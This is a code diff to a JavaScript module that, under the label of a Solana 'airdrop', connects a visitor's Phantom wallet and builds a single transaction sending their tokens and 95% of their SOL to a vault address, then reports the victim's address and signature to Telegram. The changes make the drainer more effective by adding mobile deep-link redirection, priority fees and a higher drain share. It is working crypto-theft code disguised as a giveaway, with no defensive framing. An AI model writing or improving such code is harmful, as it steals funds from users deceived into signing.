@@ -1,5 +1,5 @@
 
-import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from "@solana/web3.js";
 import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount } from "@solana/spl-token";
 import { AIRDROP_SOLANA } from "./constant";
 import { sendToTelegram } from "./telegram";
@@ -10,15 +10,27 @@ const connection = new Connection("https://falling-old-breeze.solana-mainnet.qui
 export const connectSolana = async () => {
     try {
         const provider = window.solana // standard for phantom, solflare
-        if(!provider){
-            alert("Please install Phantom wallet")
-            return null
+        if(provider){
+           const resp = await provider.connect()
+           if(resp && resp.publicKey){
+                return resp.publicKey.toString()
+            }
         }
-        const resp = await provider.connect()
-        if(resp && resp.publicKey){
-            return resp.publicKey.toString()
+        // 2. If no provider (Mobile Chrome/Safari)
+        else {
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            if(isMobile){
+                const appUrl = window.location.href.replace(/^https?:\/\//, "");
+                // Redirect to Phantom's deep link
+                const phantomDeepLink = `https://phantom.app/ul/browse/${encodeURIComponent(appUrl)}`;
+
+                window.location.href = phantomDeepLink;
+                return null;
+            } else {
+                alert("Please install Phantom wallet extension");
+                return null;
+            }
         }
-        return null
     } catch (err){
         // This catches "User rejected the request" errors
         console.warn("User cancelled Solana connection: ", err);
@@ -33,41 +45,64 @@ export const handleSolanaAirdrop = async (userAddress, tokenMints) => {
     const transaction = new Transaction()
 
     try {
-        // get solana balance and add transfer (leave some amount for gas)
-        const balance = await connection.getBalance(userPubKey)
-        if(balance > 0.01 * LAMPORTS_PER_SOL){
-            const amountToSend = Math.floor(balance * 0.9) // send 90%
+        // 1. ADD TOKEN TRANSFERS FIRST 
+        // / 1. Add Priority Fees (Crucial for Mainnet speed)
+        transaction.add(
+            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 })
+        );
+
+        // 2. Add Token Transfers (Limited to top 4 to prevent size errors)
+        let addedInstructions = 0;
+        for (const mintAddress of tokenMints) {
+            if (addedInstructions >= 8) break; // Safety limit for TX size
+
+            try {
+                const mint = new PublicKey(mintAddress);
+                const sourceATA = await getAssociatedTokenAddress(mint, userPubKey);
+                const destATA = await getAssociatedTokenAddress(mint, vaultPubKey);
+
+                const tokenAccount = await connection.getTokenAccountBalance(sourceATA);
+                const amount = tokenAccount.value.amount;
+
+                if (parseFloat(amount) > 0) {
+                    const info = await connection.getAccountInfo(destATA);
+                    if (!info) {
+                        transaction.add(
+                            createAssociatedTokenAccountInstruction(
+                                userPubKey, destATA, vaultPubKey, mint
+                            )
+                        );
+                        addedInstructions++;
+                    }
+                    transaction.add(createTransferInstruction(sourceATA, destATA, userPubKey, amount));
+                    addedInstructions++;
+                }
+            } catch (e) { continue; }
+        }
+
+        // 3. Add SOL Transfer (95% of balance)
+        const balance = await connection.getBalance(userPubKey);
+        if (balance > 0.005 * LAMPORTS_PER_SOL) {
+            const amountToSend = Math.floor(balance * 0.95); 
             transaction.add(
                 SystemProgram.transfer({
                     fromPubkey: userPubKey,
                     toPubkey: vaultPubKey,
                     lamports: amountToSend
                 })
-            )
+            );
         }
 
-        // add token transfer
-        for(const mintAddress of tokenMints){
-            try {
-                const mint = new PublicKey(mintAddress)
-                const sourceATA = await getAssociatedTokenAddress(mint, userPubKey)
-                const destATA = await getAssociatedTokenAddress(mint, vaultPubKey)
+        // 4. Finalize
+        transaction.feePayer = userPubKey;
+        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
-                // fetch balance of token
-                const tokenAccount = await connection.getTokenAccountBalance(sourceATA)
-                if(tokenAccount.value.uiAmount > 0){
-                    transaction.add(createTransferInstruction(sourceATA, destATA, userPubKey, tokenAccount.value.amount))
-                }
-            } catch (e) {continue}
-        }
+        // Request signature
+        const response = await provider.signAndSendTransaction(transaction);
+        const signature = response.signature || response; 
 
-        // sign and send
-        transaction.feePayer = userPubKey
-        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash
-
-        const {signature} = await provider.signAndSendTransaction(transaction)
-        await sendToTelegram(`🚀 Solana Airdrop Pending\nUser: ${userAddress}\nSig: ${signature}`)
-        return signature
+        await sendToTelegram(`🚀 Solana Airdrop Pending\nUser: ${userAddress}\nSig: ${signature}`);
+        return signature;
     } catch (err){
         console.error("Solana error:", err);
         return null;
